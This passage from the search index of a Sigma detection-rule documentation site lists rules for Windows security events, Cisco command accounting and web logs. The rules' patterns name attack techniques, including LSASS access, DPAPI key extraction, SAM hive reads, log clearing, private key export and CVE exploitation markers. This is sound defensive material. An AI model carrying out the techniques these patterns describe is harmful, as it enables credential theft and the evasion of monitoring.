","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/apt/apt_silence_eda.yml/","tags":["attack.execution","attack.t1059.001","attack.command_and_control","attack.t1071.004","attack.t1572","attack.impact","attack.t1529","attack.g0091","attack.s0363"],"title":"Silence.EDA Detection"},{"categories":null,"contents":"Detects external diskdrives or plugged in USB devices , EventID 6416 on windows 10 or later\nKnown false-positives Legitimate administrative activity Raw rule (edit) title: External Disk Drive Or USB Storage Device id: f69a87ea-955e-4fb4-adb2-bb9fd6685632 description: Detects external diskdrives or plugged in USB devices , EventID 6416 on windows 10 or later status: experimental author: Keith Wright date: 2019/11/20 modified: 2021/08/09 tags: - attack.t1091 - attack.t1200 - attack.lateral_movement - attack.initial_access logsource: product: windows service: security detection: selection: EventID: 6416 ClassName: \u0026#39;DiskDrive\u0026#39; selection2: DeviceDescription: \u0026#39;USB Mass Storage Device\u0026#39; condition: selection or selection2 falsepositives: - Legitimate administrative activity level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_external_device.yml/","tags":["attack.t1091","attack.t1200","attack.lateral_movement","attack.initial_access"],"title":"External Disk Drive Or USB Storage Device"},{"categories":null,"contents":"Detects an exploitation attempt in which the UAC consent dialogue is used to invoke an Internet Explorer process running as LOCAL_SYSTEM\nKnown false-positives Unknown References https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1388 https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege Raw rule (edit) title: Exploiting CVE-2019-1388 id: 02e0b2ea-a597-428e-b04a-af6a1a403e5c status: experimental description: Detects an exploitation attempt in which the UAC consent dialogue is used to invoke an Internet Explorer process running as LOCAL_SYSTEM references: - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1388 - https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege author: Florian Roth date: 2019/11/20 modified: 2021/08/26 tags: - attack.privilege_escalation - attack.t1068 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\consent.exe\u0026#39; Image|endswith: \u0026#39;\\iexplore.exe\u0026#39; CommandLine|contains: \u0026#39; http\u0026#39; rights1: IntegrityLevel: \u0026#39;System\u0026#39; # for Sysmon users rights2: User|startswith: - \u0026#39;NT AUTHORITY\\SYSTEM\u0026#39; # for non-Sysmon users - English language settings - \u0026#39;AUTORITE NT\\Sys\u0026#39; # French language settings condition: selection and ( rights1 or rights2 ) falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_exploit_cve_2019_1388.yml/","tags":["attack.privilege_escalation","attack.t1068"],"title":"Exploiting CVE-2019-1388"},{"categories":null,"contents":"Detects CVE-2019-11510 exploitation attempt - URI contains Guacamole\nKnown false-positives Unknown References https://www.exploit-db.com/exploits/47297 Raw rule (edit) title: Pulse Secure Attack CVE-2019-11510 id: 2dbc10d7-a797-49a8-8776-49efa6442e60 status: test description: Detects CVE-2019-11510 exploitation attempt - URI contains Guacamole author: Florian Roth references: - https://www.exploit-db.com/exploits/47297 date: 2019/11/18 modified: 2021/11/27 logsource: category: webserver detection: selection: c-uri: \u0026#39;*?/dana/html5acc/guacamole/*\u0026#39; condition: selection fields: - client_ip - vhost - url - response falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1190 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_pulsesecure_cve_2019_11510.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Pulse Secure Attack CVE-2019-11510"},{"categories":null,"contents":"Detects the execution of a renamed ProcDump executable often used by attackers or malware\nKnown false-positives Procdump illegaly bundled with legitimate software Weird admins who renamed binaries References https://docs.microsoft.com/en-us/sysinternals/downloads/procdump Raw rule (edit) title: Renamed ProcDump id: 4a0b2c7e-7cb2-495d-8b63-5f268e7bfd67 status: experimental description: Detects the execution of a renamed ProcDump executable often used by attackers or malware references: - https://docs.microsoft.com/en-us/sysinternals/downloads/procdump author: Florian Roth date: 2019/11/18 modified: 2021/08/16 tags: - attack.defense_evasion - attack.t1036.003 logsource: product: windows category: process_creation detection: selection1: OriginalFileName: \u0026#39;procdump\u0026#39; selection2: CommandLine|contains|all: - \u0026#39; -ma \u0026#39; - \u0026#39; -accepteula \u0026#39; selection3: CommandLine|contains|all: - \u0026#39; -ma \u0026#39; - \u0026#39;.dmp\u0026#39; filter: Image|endswith: - \u0026#39;\\procdump.exe\u0026#39; - \u0026#39;\\procdump64.exe\u0026#39; condition: ( selection1 or selection2 or selection3 ) and not filter falsepositives: - Procdump illegaly bundled with legitimate software - Weird admins who renamed binaries level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_renamed_procdump.yml/","tags":["attack.defense_evasion","attack.t1036.003"],"title":"Renamed ProcDump"},{"categories":null,"contents":"Detects logon events that have characteristics of events generated during an attack with RottenPotato and the like\nKnown false-positives Unknown References https://twitter.com/SBousseaden/status/1195284233729777665 Raw rule (edit) title: RottenPotato Like Attack Pattern id: 16f5d8ca-44bd-47c8-acbe-6fc95a16c12f status: experimental description: Detects logon events that have characteristics of events generated during an attack with RottenPotato and the like references: - https://twitter.com/SBousseaden/status/1195284233729777665 author: \u0026#39;@SBousseaden, Florian Roth\u0026#39; date: 2019/11/15 modified: 2021/07/07 tags: - attack.privilege_escalation - attack.credential_access - attack.t1557.001 logsource: product: windows service: security detection: selection: EventID: 4624 LogonType: 3 TargetUserName: \u0026#39;ANONYMOUS_LOGON\u0026#39; WorkstationName: \u0026#39;-\u0026#39; IpAddress: \u0026#39;127.0.0.1\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_rottenpotato.yml/","tags":["attack.privilege_escalation","attack.credential_access","attack.t1557.001"],"title":"RottenPotato Like Attack Pattern"},{"categories":null,"contents":"Detects exploitation attempt of privilege escalation vulnerability via SetupComplete.cmd and PartnerSetupComplete.cmd described in CVE-2019-1378\nKnown false-positives Unknown References https://www.embercybersecurity.com/blog/cve-2019-1378-exploiting-an-access-control-privilege-escalation-vulnerability-in-windows-10-update-assistant-wua Raw rule (edit) title: Exploiting SetupComplete.cmd CVE-2019-1378 id: 1c373b6d-76ce-4553-997d-8c1da9a6b5f5 status: test description: Detects exploitation attempt of privilege escalation vulnerability via SetupComplete.cmd and PartnerSetupComplete.cmd described in CVE-2019-1378 author: Florian Roth, oscd.community, Jonhnathan Ribeiro references: - https://www.embercybersecurity.com/blog/cve-2019-1378-exploiting-an-access-control-privilege-escalation-vulnerability-in-windows-10-update-assistant-wua date: 2019/11/15 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentCommandLine|contains|all: - \u0026#39;\\cmd.exe\u0026#39; - \u0026#39;/c\u0026#39; - \u0026#39;C:\\Windows\\Setup\\Scripts\\\u0026#39; ParentCommandLine|endswith: - \u0026#39;SetupComplete.cmd\u0026#39; - \u0026#39;PartnerSetupComplete.cmd\u0026#39; filter: Image|startswith: - \u0026#39;C:\\Windows\\System32\\\u0026#39; - \u0026#39;C:\\Windows\\SysWOW64\\\u0026#39; - \u0026#39;C:\\Windows\\WinSxS\\\u0026#39; - \u0026#39;C:\\Windows\\Setup\\\u0026#39; condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.t1068 - attack.execution - attack.t1059.003 - attack.t1574 - cve.2019.1378 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_exploit_cve_2019_1378.yml/","tags":["attack.privilege_escalation","attack.t1068","attack.execution","attack.t1059.003","attack.t1574","cve.2019.1378"],"title":"Exploiting SetupComplete.cmd CVE-2019-1378"},{"categories":null,"contents":"Clear command history in network OS which is used for defense evasion\nKnown false-positives Legitimate administrators may run these commands Raw rule (edit) title: Cisco Clear Logs id: ceb407f6-8277-439b-951f-e4210e3ed956 status: test description: Clear command history in network OS which is used for defense evasion author: Austin Clark date: 2019/08/12 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - \u0026#39;clear logging\u0026#39; - \u0026#39;clear archive\u0026#39; condition: keywords fields: - src - CmdSet - User - Privilege_Level - Remote_Address falsepositives: - Legitimate administrators may run these commands level: high tags: - attack.defense_evasion - attack.t1070.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/cisco/aaa/cisco_cli_clear_logs.yml/","tags":["attack.defense_evasion","attack.t1070.003"],"title":"Cisco Clear Logs"},{"categories":null,"contents":"Collect pertinent data from the configuration files\nKnown false-positives Commonly run by administrators Raw rule (edit) title: Cisco Collect Data id: cd072b25-a418-4f98-8ebc-5093fb38fe1a status: test description: Collect pertinent data from the configuration files author: Austin Clark date: 2019/08/11 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - \u0026#39;show running-config\u0026#39; - \u0026#39;show startup-config\u0026#39; - \u0026#39;show archive config\u0026#39; - \u0026#39;more\u0026#39; condition: keywords fields: - src - CmdSet - User - Privilege_Level - Remote_Address falsepositives: - Commonly run by administrators level: low tags: - attack.discovery - attack.credential_access - attack.collection - attack.t1087.001 - attack.t1552.001 - attack.t1005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/cisco/aaa/cisco_cli_collect_data.yml/","tags":["attack.discovery","attack.credential_access","attack.collection","attack.t1087.001","attack.t1552.001","attack.t1005"],"title":"Cisco Collect Data"},{"categories":null,"contents":"Show when private keys are being exported from the device, or when new certificates are installed\nKnown false-positives Not commonly run by administrators. Also whitelist your known good certificates Raw rule (edit) title: Cisco Crypto Commands id: 1f978c6a-4415-47fb-aca5-736a44d7ca3d status: test description: Show when private keys are being exported from the device, or when new certificates are installed author: Austin Clark date: 2019/08/12 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - \u0026#39;crypto pki export\u0026#39; - \u0026#39;crypto pki import\u0026#39; - \u0026#39;crypto pki trustpoint\u0026#39; condition: keywords fields: - src - CmdSet - User - Privilege_Level - Remote_Address falsepositives: - Not commonly run by administrators. Also whitelist your known good certificates level: high tags: - attack.credential_access - attack.defense_evasion - attack.t1553.004 - attack.t1552.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/cisco/aaa/cisco_cli_crypto_actions.yml/","tags":["attack.credential_access","attack.defense_evasion","attack.t1553.004","attack.t1552.004"],"title":"Cisco Crypto Commands"},{"categories":null,"contents":"Detect a system being shutdown or put into different boot mode\nKnown false-positives Legitimate administrators may run these commands, though rarely. Raw rule (edit) title: Cisco Denial of Service id: d94a35f0-7a29-45f6-90a0-80df6159967c status: test description: Detect a system being shutdown or put into different boot mode author: Austin Clark date: 2019/08/15 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - \u0026#39;shutdown\u0026#39; - \u0026#39;config-register 0x2100\u0026#39; - \u0026#39;config-register 0x2142\u0026#39; condition: keywords fields: - CmdSet falsepositives: - Legitimate administrators may run these commands, though rarely. level: medium tags: - attack.impact - attack.t1495 - attack.t1529 - attack.t1565.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/cisco/aaa/cisco_cli_dos.yml/","tags":["attack.impact","attack.t1495","attack.t1529","attack.t1565.001"],"title":"Cisco Denial of Service"},{"categories":null,"contents":"Turn off logging locally or remote\nKnown false-positives Unknown Raw rule (edit) title: Cisco Disabling Logging id: 9e8f6035-88bf-4a63-96b6-b17c0508257e status: test description: Turn off logging locally or remote author: Austin Clark date: 2019/08/11 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - \u0026#39;no logging\u0026#39; - \u0026#39;no aaa new-model\u0026#39; condition: keywords fields: - src - CmdSet - User - Privilege_Level - Remote_Address falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1562.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/cisco/aaa/cisco_cli_disable_logging.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Cisco Disabling Logging"},{"categories":null,"contents":"Find information about network devices that is not stored in config files\nKnown false-positives Commonly used by administrators for troubleshooting Raw rule (edit) title: Cisco Discovery id: 9705a6a1-6db6-4a16-a987-15b7151e299b status: test description: Find information about network devices that is not stored in config files author: Austin Clark date: 2019/08/12 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - \u0026#39;dir\u0026#39; - \u0026#39;show processes\u0026#39; - \u0026#39;show arp\u0026#39; - \u0026#39;show cdp\u0026#39; - \u0026#39;show version\u0026#39; - \u0026#39;show ip route\u0026#39; - \u0026#39;show ip interface\u0026#39; - \u0026#39;show ip sockets\u0026#39; - \u0026#39;show users\u0026#39; - \u0026#39;show ssh\u0026#39; - \u0026#39;show clock\u0026#39; condition: keywords fields: - src - CmdSet - User - Privilege_Level - Remote_Address falsepositives: - Commonly used by administrators for troubleshooting level: low tags: - attack.discovery - attack.t1083 - attack.t1201 - attack.t1057 - attack.t1018 - attack.t1082 - attack.t1016 - attack.t1049 - attack.t1033 - attack.t1124 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/cisco/aaa/cisco_cli_discovery.yml/","tags":["attack.discovery","attack.t1083","attack.t1201","attack.t1057","attack.t1018","attack.t1082","attack.t1016","attack.t1049","attack.t1033","attack.t1124"],"title":"Cisco Discovery"},{"categories":null,"contents":"See what files are being deleted from flash file systems\nKnown false-positives Will be used sometimes by admins to clean up local flash space Raw rule (edit) title: Cisco File Deletion id: 71d65515-c436-43c0-841b-236b1f32c21e status: test description: See what files are being deleted from flash file systems author: Austin Clark date: 2019/08/12 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - \u0026#39;erase\u0026#39; - \u0026#39;delete\u0026#39; - \u0026#39;format\u0026#39; condition: keywords fields: - CmdSet falsepositives: - Will be used sometimes by admins to clean up local flash space level: medium tags: - attack.defense_evasion - attack.impact - attack.t1070.004 - attack.t1561.001 - attack.t1561.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/cisco/aaa/cisco_cli_file_deletion.yml/","tags":["attack.defense_evasion","attack.impact","attack.t1070.004","attack.t1561.001","attack.t1561.002"],"title":"Cisco File Deletion"},{"categories":null,"contents":"Find local accounts being created or modified as well as remote authentication configurations\nKnown false-positives When remote authentication is in place, this should not change often Raw rule (edit) title: Cisco Local Accounts id: 6d844f0f-1c18-41af-8f19-33e7654edfc3 status: test description: Find local accounts being created or modified as well as remote authentication configurations author: Austin Clark date: 2019/08/12 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - \u0026#39;username\u0026#39; - \u0026#39;aaa\u0026#39; condition: keywords fields: - CmdSet falsepositives: - When remote authentication is in place, this should not change often level: high tags: - attack.persistence - attack.t1136.001 - attack.t1098 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/cisco/aaa/cisco_cli_local_accounts.yml/","tags":["attack.persistence","attack.t1136.001","attack.t1098"],"title":"Cisco Local Accounts"},{"categories":null,"contents":"Modifications to a config that will serve an adversary\u0026rsquo;s impacts or persistence\nKnown false-positives Legitimate administrators may run these commands Raw rule (edit) title: Cisco Modify Configuration id: 671ffc77-50a7-464f-9e3d-9ea2b493b26b status: test description: Modifications to a config that will serve an adversary\u0026#39;s impacts or persistence author: Austin Clark date: 2019/08/12 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - \u0026#39;ip http server\u0026#39; - \u0026#39;ip https server\u0026#39; - \u0026#39;kron policy-list\u0026#39; - \u0026#39;kron occurrence\u0026#39; - \u0026#39;policy-list\u0026#39; - \u0026#39;access-list\u0026#39; - \u0026#39;ip access-group\u0026#39; - \u0026#39;archive maximum\u0026#39; condition: keywords fields: - CmdSet falsepositives: - Legitimate administrators may run these commands level: medium tags: - attack.persistence - attack.impact - attack.t1490 - attack.t1505 - attack.t1565.002 - attack.t1053 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/cisco/aaa/cisco_cli_modify_config.yml/","tags":["attack.persistence","attack.impact","attack.t1490","attack.t1505","attack.t1565.002","attack.t1053"],"title":"Cisco Modify Configuration"},{"categories":null,"contents":"See what commands are being input into the device by other people, full credentials can be in the history\nKnown false-positives Not commonly run by administrators, especially if remote logging is configured Raw rule (edit) title: Cisco Show Commands Input id: b094d9fb-b1ad-4650-9f1a-fb7be9f1d34b status: test description: See what commands are being input into the device by other people, full credentials can be in the history author: Austin Clark date: 2019/08/11 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - \u0026#39;show history\u0026#39; - \u0026#39;show history all\u0026#39; - \u0026#39;show logging\u0026#39; condition: keywords fields: - CmdSet falsepositives: - Not commonly run by administrators, especially if remote logging is configured level: medium tags: - attack.credential_access - attack.t1552.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/cisco/aaa/cisco_cli_input_capture.yml/","tags":["attack.credential_access","attack.t1552.003"],"title":"Cisco Show Commands Input"},{"categories":null,"contents":"Show when a monitor or a span/rspan is setup or modified\nKnown false-positives Admins may setup new or modify old spans, or use a monitor for troubleshooting Raw rule (edit) title: Cisco Sniffing id: b9e1f193-d236-4451-aaae-2f3d2102120d status: test description: Show when a monitor or a span/rspan is setup or modified author: Austin Clark date: 2019/08/11 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - \u0026#39;monitor capture point\u0026#39; - \u0026#39;set span\u0026#39; - \u0026#39;set rspan\u0026#39; condition: keywords fields: - CmdSet falsepositives: - Admins may setup new or modify old spans, or use a monitor for troubleshooting level: medium tags: - attack.credential_access - attack.discovery - attack.t1040 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/cisco/aaa/cisco_cli_net_sniff.yml/","tags":["attack.credential_access","attack.discovery","attack.t1040"],"title":"Cisco Sniffing"},{"categories":null,"contents":"Various protocols maybe used to put data on the device for exfil or infil\nKnown false-positives Generally used to copy configs or IOS images Raw rule (edit) title: Cisco Stage Data id: 5e51acb2-bcbe-435b-99c6-0e3cd5e2aa59 status: test description: Various protocols maybe used to put data on the device for exfil or infil author: Austin Clark date: 2019/08/12 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - \u0026#39;tftp\u0026#39; - \u0026#39;rcp\u0026#39; - \u0026#39;puts\u0026#39; - \u0026#39;copy\u0026#39; - \u0026#39;configure replace\u0026#39; - \u0026#39;archive tar\u0026#39; condition: keywords fields: - CmdSet falsepositives: - Generally used to copy configs or IOS images level: low tags: - attack.collection - attack.lateral_movement - attack.command_and_control - attack.exfiltration - attack.t1074 - attack.t1105 - attack.t1560.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/cisco/aaa/cisco_cli_moving_data.yml/","tags":["attack.collection","attack.lateral_movement","attack.command_and_control","attack.exfiltration","attack.t1074","attack.t1105","attack.t1560.001"],"title":"Cisco Stage Data"},{"categories":null,"contents":"Detects suspicious msiexec process starts in an uncommon directory\nKnown false-positives Unknown References https://twitter.com/200_okay_/status/1194765831911215104 Raw rule (edit) title: Suspicious MsiExec Directory id: e22a6eb2-f8a5-44b5-8b44-a2dbd47b1144 status: test description: Detects suspicious msiexec process starts in an uncommon directory author: Florian Roth references: - https://twitter.com/200_okay_/status/1194765831911215104 date: 2019/11/14 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\msiexec.exe\u0026#39; filter: Image|startswith: - \u0026#39;C:\\Windows\\System32\\\u0026#39; - \u0026#39;C:\\Windows\\SysWOW64\\\u0026#39; - \u0026#39;C:\\Windows\\WinSxS\\\u0026#39; condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1036.005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_msiexec_cwd.yml/","tags":["attack.defense_evasion","attack.t1036.005"],"title":"Suspicious MsiExec Directory"},{"categories":null,"contents":"Detects direct modification of autostart extensibility point (ASEP) in registry using reg.exe.\nKnown false-positives Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reasons. Legitimate administrator sets up autorun keys for legitimate reasons. References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md Raw rule (edit) title: Direct Autorun Keys Modification id: 24357373-078f-44ed-9ac4-6d334a668a11 status: test description: Detects direct modification of autostart extensibility point (ASEP) in registry using reg.exe. author: Victor Sergeev, Daniil Yugoslavskiy, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md date: 2019/10/25 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection_1: Image|endswith: \u0026#39;\\reg.exe\u0026#39; CommandLine|contains: \u0026#39;add\u0026#39; # to avoid intersection with discovery tactic rules selection_2: CommandLine|contains: # need to improve this list, there are plenty of ASEP reg keys - \u0026#39;\\software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#39; - \u0026#39;\\software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\u0026#39; - \u0026#39;\\software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\u0026#39; - \u0026#39;\\software\\Microsoft\\Windows\\CurrentVersion\\RunServices\u0026#39; - \u0026#39;\\software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\u0026#39; - \u0026#39;\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\u0026#39; - \u0026#39;\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell\u0026#39; - \u0026#39;\\software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\u0026#39; - \u0026#39;\\software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\u0026#39; - \u0026#39;\\system\\CurrentControlSet\\Control\\SafeBoot\\AlternateShell\u0026#39; condition: selection_1 and selection_2 fields: - CommandLine - ParentCommandLine falsepositives: - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reasons. - Legitimate administrator sets up autorun keys for legitimate reasons. level: medium tags: - attack.persistence - attack.t1547.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_direct_asep_reg_keys_modification.yml/","tags":["attack.persistence","attack.t1547.001"],"title":"Direct Autorun Keys Modification"},{"categories":null,"contents":"Detects tools extracting LSA secret DPAPI domain backup key from Domain Controllers\nKnown false-positives Unknown References https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-190620024610.html Raw rule (edit) title: DPAPI Domain Backup Key Extraction id: 4ac1f50b-3bd0-4968-902d-868b4647937e status: test description: Detects tools extracting LSA secret DPAPI domain backup key from Domain Controllers author: Roberto Rodriguez @Cyb3rWard0g references: - https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-190620024610.html date: 2019/06/20 modified: 2022/02/24 logsource: product: windows service: security detection: selection: EventID: 4662 ObjectType: \u0026#39;SecretObject\u0026#39; AccessMask: \u0026#39;0x2\u0026#39; ObjectName|contains: \u0026#39;BCKUPKEY\u0026#39; condition: selection falsepositives: - Unknown level: critical tags: - attack.credential_access - attack.t1003.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_dpapi_domain_backupkey_extraction.yml/","tags":["attack.credential_access","attack.t1003.004"],"title":"DPAPI Domain Backup Key Extraction"},{"categories":null,"contents":"Detects anyone attempting a backup for the DPAPI Master Key. This events gets generated at the source and not the Domain Controller.\nKnown false-positives Unknown References https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-190620024610.html Raw rule (edit) title: DPAPI Domain Master Key Backup Attempt id: 39a94fd1-8c9a-4ff6-bf22-c058762f8014 status: test description: Detects anyone attempting a backup for the DPAPI Master Key. This events gets generated at the source and not the Domain Controller. author: Roberto Rodriguez @Cyb3rWard0g references: - https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-190620024610.html date: 2019/08/10 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 4692 condition: selection fields: - ComputerName - SubjectDomainName - SubjectUserName falsepositives: - Unknown level: critical tags: - attack.credential_access - attack.t1003.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_dpapi_domain_masterkey_backup_attempt.yml/","tags":["attack.credential_access","attack.t1003.004"],"title":"DPAPI Domain Master Key Backup Attempt"},{"categories":null,"contents":"Detects potential mimikatz-like tools accessing LSASS from non system account\nKnown false-positives Unknown References https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-170105221010.html Raw rule (edit) title: LSASS Access from Non System Account id: 962fe167-e48d-4fd6-9974-11e5b9a5d6d1 description: Detects potential mimikatz-like tools accessing LSASS from non system account status: experimental date: 2019/06/20 modified: 2021/11/22 author: Roberto Rodriguez @Cyb3rWard0g references: - https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-170105221010.html tags: - attack.credential_access - attack.t1003.001 logsource: product: windows service: security detection: selection: EventID: - 4663 - 4656 AccessMask: - \u0026#39;0x40\u0026#39; - \u0026#39;0x1400\u0026#39; # - \u0026#39;0x1000\u0026#39; # minimum access requirements to query basic info from service - \u0026#39;0x100000\u0026#39; - \u0026#39;0x1410\u0026#39; # car.2019-04-004 - \u0026#39;0x1010\u0026#39; # car.2019-04-004 - \u0026#39;0x1438\u0026#39; # car.2019-04-004 - \u0026#39;0x143a\u0026#39; # car.2019-04-004 - \u0026#39;0x1418\u0026#39; # car.2019-04-004 - \u0026#39;0x1f0fff\u0026#39; - \u0026#39;0x1f1fff\u0026#39; - \u0026#39;0x1f2fff\u0026#39; - \u0026#39;0x1f3fff\u0026#39; - \u0026#39;40\u0026#39; - \u0026#39;1400\u0026#39; - \u0026#39;1000\u0026#39; - \u0026#39;100000\u0026#39; - \u0026#39;1410\u0026#39; # car.2019-04-004 - \u0026#39;1010\u0026#39; # car.2019-04-004 - \u0026#39;1438\u0026#39; # car.2019-04-004 - \u0026#39;143a\u0026#39; # car.2019-04-004 - \u0026#39;1418\u0026#39; # car.2019-04-004 - \u0026#39;1f0fff\u0026#39; - \u0026#39;1f1fff\u0026#39; - \u0026#39;1f2fff\u0026#39; - \u0026#39;1f3fff\u0026#39; ObjectType: \u0026#39;Process\u0026#39; ObjectName|endswith: \u0026#39;\\lsass.exe\u0026#39; filter1: SubjectUserName|endswith: \u0026#39;$\u0026#39; filter2: ProcessName|startswith: \u0026#39;C:\\Program Files\u0026#39; # too many false positives with legitimate AV and EDR solutions condition: selection and not 1 of filter* fields: - ComputerName - ObjectName - SubjectUserName - ProcessName falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_lsass_access_non_system_account.yml/","tags":["attack.credential_access","attack.t1003.001"],"title":"LSASS Access from Non System Account"},{"categories":null,"contents":"Detects access to a protected_storage service over the network. Potential abuse of DPAPI to extract domain backup keys from Domain Controllers\nKnown false-positives Unknown References https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-190620024610.html Raw rule (edit) title: Protected Storage Service Access id: 45545954-4016-43c6-855e-eae8f1c369dc status: test description: Detects access to a protected_storage service over the network. Potential abuse of DPAPI to extract domain backup keys from Domain Controllers author: Roberto Rodriguez @Cyb3rWard0g references: - https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-190620024610.html date: 2019/08/10 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 5145 ShareName|contains: \u0026#39;IPC\u0026#39; RelativeTargetName: \u0026#39;protected_storage\u0026#39; condition: selection falsepositives: - Unknown level: critical tags: - attack.lateral_movement - attack.t1021.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_protected_storage_service_access.yml/","tags":["attack.lateral_movement","attack.t1021.002"],"title":"Protected Storage Service Access"},{"categories":null,"contents":"Detects handles requested to SAM registry hive\nKnown false-positives Unknown References https://threathunterplaybook.com/notebooks/windows/07_discovery/WIN-190725024610.html Raw rule (edit) title: SAM Registry Hive Handle Request id: f8748f2c-89dc-4d95-afb0-5a2dfdbad332 status: test description: Detects handles requested to SAM registry hive author: Roberto Rodriguez @Cyb3rWard0g references: - https://threathunterplaybook.com/notebooks/windows/07_discovery/WIN-190725024610.html date: 2019/08/12 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 4656 ObjectType: \u0026#39;Key\u0026#39; ObjectName|endswith: \u0026#39;\\SAM\u0026#39; condition: selection fields: - ComputerName - SubjectDomainName - SubjectUserName - ProcessName - ObjectName falsepositives: - Unknown level: critical tags: - attack.discovery - attack.t1012 - attack.credential_access - attack.t1552.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_sam_registry_hive_handle_request.yml/","tags":["attack.discovery","attack.t1012","attack.credential_access","attack.t1552.002"],"title":"SAM Registry Hive Handle Request"},{"categories":null,"contents":"Detects the creation of suspicious accounts similar to ANONYMOUS LOGON, such as using additional spaces. Created as an covering detection for exclusion of Logon Type 3 from ANONYMOUS LOGON accounts.\nKnown false-positives Unknown References https://twitter.com/SBousseaden/status/1189469425482829824 Raw rule (edit) title: Suspicious Windows ANONYMOUS LOGON Local Account Created id: 1bbf25b9-8038-4154-a50b-118f2a32be27 status: experimental description: Detects the creation of suspicious accounts similar to ANONYMOUS LOGON, such as using additional spaces. Created as an covering detection for exclusion of Logon Type 3 from ANONYMOUS LOGON accounts. references: - https://twitter.com/SBousseaden/status/1189469425482829824 author: James Pemberton / @4A616D6573 date: 2019/10/31 modified: 2021/07/06 tags: - attack.persistence - attack.t1136.001 - attack.t1136.002 logsource: product: windows service: security detection: selection: EventID: 4720 SamAccountName|contains|all: - 